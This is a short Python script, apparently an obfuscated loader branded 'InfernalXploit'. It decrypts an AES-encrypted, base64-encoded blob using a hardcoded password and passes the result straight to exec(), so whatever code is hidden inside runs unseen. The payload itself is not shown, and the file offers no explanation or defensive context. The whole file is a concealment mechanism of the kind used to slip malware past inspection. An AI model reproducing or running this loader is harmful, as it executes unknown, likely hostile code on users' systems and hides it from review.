
# Encoded by InfernalXploit
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt(enc_data, password):
    key = hashlib.sha256(password.encode()).digest()
    enc_bytes = base64.b64decode(enc_data)
    iv = enc_bytes[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc_bytes[AES.block_size:]), AES.block_size).decode()

password = "12345678910"
exec(decrypt("hQroxcEfN6mfiYjUt2ttys/hSPQOWXZHx5V7kJuNXQd50mVZREi9qLatO8s0pIDxZ9k+Q5tHfOllwASw9P2SReu+35zyHeAhTFP5gwjfqtKmbOlFzRkZSnXGsP3+49CkDw/ngme7cLbrEW6rHH/yMvWQOZ4qu/6n+P2lUvPdoeJ/kfGjCpGBzT7jQt4rj2MaGv3dkNmxF/QBRrXNzzI/fzM92ZRJIdbXvE6rsr2hBZm3dfwPjVRpvEFtQ9PhRe6nQ+J6oyaR8qX8JT5mG3ungGnBLfLeyaRVtiBXyqj/k0ldcRoKLiM07dvSWQGupRbpSlREuN83QCj89Ik1kuGLbb0nmaX9e2OPzt+LPU+QtZY7gYTjLSGJt24aze2sqCCJvQhp/Dk74VMjmlx1twR7/+yxJUc2cv0gqZpbOLPicz2szFd9LHj1tCFlhjDGenr24MoGJ4TKmDxxPnrhMybNEwZOxNd3pkHiFIE5UqM0DpA0pqkHz2BAzeLBOFlcnZc5RSr9iWFMzerAjVwJklHXUw/xS95kmr89D1cNKZVJ86VvbpqrsfMpUVUOL0/WaMKEs2ezBwOBslspzuyUkWzcEX0Hq8se+fA20t53dJkOuutHmBjQ3+ijePDDivyUmLADrNwJRr3TKB2IE6leqHUaeM7jMuk9Zr40xVYcnTt84AQwOoMaGkDHJOYgXEVapJw+eVIHnGB0jorhykXBZI8H+/Ht941M0JSBSU+0sXhaUDg3bm15NbEmgSrSuWbYa66fZA/7a0LkhhHAbmY63a+ewfugaK6MHiHPXz7KOSbGI/rGJb1/BSuNZTydDAhyrUopepNtu2M26e6Mk0IQHqvLOIyC8OvRBSHy3uVERb2WZBIBCeVPjd/EJkEgOQzMf52AvXMa6LPb79Rzu2h+YXJxHA==", password))
